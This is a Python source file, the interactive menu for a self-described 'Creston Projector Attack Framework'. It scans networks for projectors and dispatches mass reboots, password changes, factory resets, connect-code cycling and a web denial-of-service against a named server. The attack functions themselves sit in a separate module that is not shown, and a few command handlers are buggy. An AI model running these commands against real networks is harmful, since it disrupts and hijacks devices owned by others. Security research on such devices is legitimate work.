#------------------------------------------------------------------------------------
#
#	GUI
#
#	Contains User Interface
#
#
#
#
#-----------------------------------------------------------------------------------

import requests
import ipaddress
import hashlib
import time
import random
import urllib3
from art import *
import creston



urllib3.disable_warnings()

#Command to print ascii art cause all cool hacker tools have ascii art!
def printAsciiTitle():
        asciiArt = text2art("CMBF",font="graffiti")
        print(asciiArt)

printAsciiTitle()

#Print the welcome message cause we are cordial and polite
print(" Welcome to the Creston Projector Attack Framework")
print(" To start type a command, or type \'help\' to see available options")
print(" To learn more about a command type \'help [command]\'")

#Array to Hold Hosts
live_hosts = []
#Array To Hold Models
model_dict = []

while True:
	#Get User Input
	command_input = input(" > ")
	
	#Print out the basic help menu
	if command_input == 'help' and len(command_input) == 4:
		print(" Commands")
		print(" network_scan.... This will scan the network for projectors")
		print(" add_host........ This will allow you to manually enter IPs to the live hosts")
		print(" print_hosts..... This will allow you to see all live hosts")
		print(" model_scan...... This will take any live hosts and identify the model type")
		print(" print_model..... This will display all live hosts")
		print(" reboot.......... This will take begin rebooting the devices")
		print(" pass_change..... This will change the current password")
		print(" restore......... This will restore the device to factory settings")
		print(" web_dos......... This will begin sending web requests to the target device")
		print(" code_cycle...... This will being causing the connect code to change\n")
	
	#Printn out help messages for each individual fucntion
	if command_input[:4] == 'help' and len(command_input) > 4:
		if 'network_scan' in command_input:
			print(" This funciton will scan the network for devices with http open")
			print(" To run, type \'network_scan\' followed by a network range in CIDR notation")
			print(" Example: network_scan 10.10.10.0/24\n")
		elif 'add_host' in command_input:
			print(" This fuction will add a new host to the live hosts")
			print(" To run, type \'add_host\' followed by an ip")
			print(" Example: add_host 10.10.10.10\n")
		elif 'print_hosts' in command_input:
			print(" This funciton will display all live hosts")
			print(" To run, type \'print_hosts\'")
			print(" Example: print_hosts\n")
		elif 'model_scan' in command_input:
			print(" This function will scan all live hosts to identify the model")
			print(" To run, type \'model_scan\'")
			print(" Example: model_scan\n")
		elif 'print_model' in command_input:
			print(" This funciton will display the IP and model of all live hosts")
			print(" To run, type \'print_model\'")
			print(" Example: print_model\n")
		elif 'reboot' in command_input:
			print(" This function will reboot all live hosts")
			print(" To run, type \'reboot\' followed by the username and password")
			print(" Example: reboot username password\n")
		elif 'pass_change' in command_input:
			print(" This function will change the password of live hosts")
			print(" To run, type \'pass_change\' followed by a username, the password, and the new password")
			print(" Example: pass_change username oldpass newpass\n")
		elif 'restore' in command_input:
			print(" This function will restore the device to factor default")
			print(" To run, type \'restore\' followed by the targer ip")
			print(" Example: restore 10.10.10.10\n")
		elif 'web_dos' in command_input:
			print(" This funciton will begin sending arbitrary web requests to the target machine")
			print(" To run, type \'web_dos\' followed by the systems ip, username, password, and the target web server")
			print(" Example: web_dos 10.10.10.10 username password wbteach.com\n")
		elif 'code_cycle' in command_input:
			print(" This function will begin changing the connect code as quickly as the system will allow")
			print(" To run, type \'code_cycle\' followed by an IP, the username, and the password")
			print(" Example: code_cycle 10.10.10.10 username password\n")
	
	#Clear the Screen if its feeling too cluttered
	elif command_input == 'clear':
		print('\n' * 40)

	#Get the user input for the network scan
	elif command_input[:12] == 'network_scan':
		#Grab the ip range for the scan
		command_input = command_input.split(" ")
		ip_range = command_input[1]
		#Scan network and return the live hosts
		live_hosts = creston.network_scan(ip_range)
	
	#Get the user input to manually add a host
	elif command_input[:8] == 'add_host':
		#Grab the host IP to add
		command_input = command_input.split(" ")
		live = command_input[1]
		#Add the specified IP
		live_hosts.append(live)
		
	#Print out all live hosts
	elif command_input[:11] == 'print_hosts':
		print("Live Hosts")
		#Loop through all live hosts
		for host in live_hosts:
			print(host)
	
	#Run the model scan on all live hosts
	elif command_input[:10] == 'model_scan':
		model_dict = creston.model_type(live_hosts)

	#Print the models
	elif command_input[:11] == 'print_model':
		print("Models")
		for host in model_dict:
			print(host + " : " + model_dict[host])

	#Grab the user input for a reboot
	elif command_input[:6] == 'reboot':
		#Grab username and password for input
		command_input = command_input.split(" ")
		username = command_input[1]
		password = command_input[2]
		#loop through hosts and start rebooting
		for hosts in model_dict:
			creston.reboot(hosts,model_dict[hosts],username,password)
	
	#Grab the user input for a pass change
	elif command_input[:11] == 'pass_change':
		#Grab username, current password, and new password
		comand_input = command_input.split(" ")
		username = command_input[1]
		password = command_input[2]
		newpass = command_input[3]
		#Run through change passwordds based on the model
		for hosts in model_dict:
			if model_dict[hosts] == 'OG':
				creston.change_pass(hosts,model_dict[hosts],username,password,newpass)
			else:
				pass
	#Grab the input and perform a factory restore
	elif command_input[:7] == 'restore':
		#Loop through the host and perform a factory restore
		for hosts in model_dict:
			creston.restore(hosts,model_dict[hosts])
			
	#Begin sending web requests form the projects
	#This is a proof of concept and does not contianully send requets
	elif command_input[:7] == 'web_dos':
		#Grab host, username, password, and webserver
		command_input == command_input.split(" ")
		host = command_input[1]
		username = command_input[2]
		password = command_input[3]
		webserver = command_input[4]
		creston.web_dos(host,username,password,webserver)
	
	#Quit the program
	elif command_input == 'exit':
		exit()
